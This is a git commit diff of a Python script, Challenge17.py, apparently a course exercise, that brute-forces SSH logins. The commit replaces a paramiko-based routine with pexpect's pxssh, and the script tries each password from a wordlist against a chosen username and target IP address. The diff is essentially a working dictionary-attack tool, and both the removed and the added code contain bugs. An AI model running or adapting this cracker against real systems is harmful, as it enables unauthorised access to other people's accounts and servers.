629d1ca005701db6f778adb01eec4d0b5abb4e7d
forexsnyder <forexsnyder@gmail.com>
2020-10-27 16:56:05 -0700

    m

--- Challenge17.py
+++ Challenge17.py
@@ -9,41 +9,20 @@ import smtplib
 import itertools
 import sys
 import time
-import getpass
-import paramiko
-import os
-import socket
+from pexpect import pxssh
 
 def cracker(user, ipAddress, txtFile ):
     filepath =open(txtFile)
+    s=pxssh.pxssh()
     for i in filepath.readlines():
         secret=i.strip("\n")
+        print(secret)
         try:
-            response= bruteForceSSH(secret, user, ipAddress)
-            if response ==0:
-                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, secret, line))
-                sys.exit(0)
-            elif response ==1:
-                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, line))
-            elif response ==2:
-                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, password, line))
-        except Exception:
-            print(Exception)
-            pass
-
-def bruteForceSSH(secret, ipAddress, user):
-    ssh=paramiko.SSHClient()
-    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-    try:
-        ssh.connect(host=ipAddress,port=22, username=user, password=secret)
-    except paramiko.AuthenticationException:
-        code =1
-    except socket.error:
-        code =2
-    ssh.close()
-    return code
-
-
+            s.login(ipAddress, user, secret)
+        except pxssh.ExceptionPxssh as e:
+            print ("pxssh failed to login")
+            print(e)
+            
 def main():
     print("Shall we play a game?")
     user=input("What is the username for the SSH connection?")
@@ -51,10 +30,8 @@ def main():
     txtFile="/home/jeff/Desktop/sample.txt"
     # ipAddress=input("What is the ip address of the target system?")
     # txtFile=input("What is the folder path to your dictionary file?")
-    cracker(user, ipAddress, txtFile)
-    
+    cracker(user, ipAddress, txtFile)  
 main()
 
 
 
-# with help from https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
